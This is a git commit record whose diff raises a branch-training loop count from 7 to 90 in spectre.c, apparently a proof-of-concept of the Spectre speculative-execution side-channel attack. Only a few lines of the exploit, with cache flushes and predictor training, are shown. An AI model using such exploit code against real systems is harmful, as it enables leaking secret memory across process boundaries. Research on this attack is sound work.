5b4f355b9a66b86d7c92c0da411a38adc5f08cfd
xkf15 <13051775153@163.com>
2020-12-02 08:27:15 -0500

    J loop 90

--- spectre.c
+++ spectre.c
@@ -66,7 +66,7 @@ void spectre(size_t offset){
 		flushSideChannel();
 		training_x = trial_idx % buffer_size;
 
-		for (j=0; j<7; j++) {
+		for (j=0; j<90; j++) {
 			flush(&buffer_size);
 			for (volatile int z = 0; z < 100; z++){}
 			//asm volatile("DSB SY");
